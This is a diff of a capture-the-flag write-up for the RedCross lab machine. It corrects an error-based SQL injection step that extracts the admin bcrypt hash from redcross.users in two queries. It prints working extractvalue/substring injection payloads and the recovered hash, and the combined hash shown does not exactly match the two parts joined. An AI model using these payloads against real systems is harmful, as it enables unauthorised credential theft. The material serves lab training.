@@ -128,9 +128,10 @@ Machine IP: 10.10.10.113 - Debian
   - Extract: Passwords.
   - Query: `') and extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 0,1)))-- -`.
 ![image](https://user-images.githubusercontent.com/83878909/229367688-1cf32661-e990-4ac2-b893-a29fb7746b17.png)
-  - The above query returned the password for user `admin` however the passqord is not complete. The SQL query needs to be modified and then the password will be return in two parts.
+  - The above query returned the password for user `admin` however the passqord is not complete. The SQL query needs to be modified and then the password will be returned in two parts using two different queries.
   - Query1 : (User:admin - Password) - `') and extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 0,1)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229367688-1cf32661-e990-4ac2-b893-a29fb7746b17.png)
   - Query2 : (User:admin - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 0,1) FROM 30)))-- -`
-![image](https://user-images.githubusercontent.com/83878909/229368053-208b6b3e-871a-47ae-b549-fa88babc2660.png)
-  - Combining Both: `$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX` + `PXKt0SthLOyU438ajqRBtrb7ZADpwq.` = `$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
+![image](https://user-images.githubusercontent.com/83878909/229368328-a49d9ad2-7b8d-4023-8cc5-c77205eccbd7.png)
+  - Combining Both: `$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX` + `Kt0SthLOyU438ajqRBtrb7ZADpwq.` = `$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
+  - Creds: `admin:$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
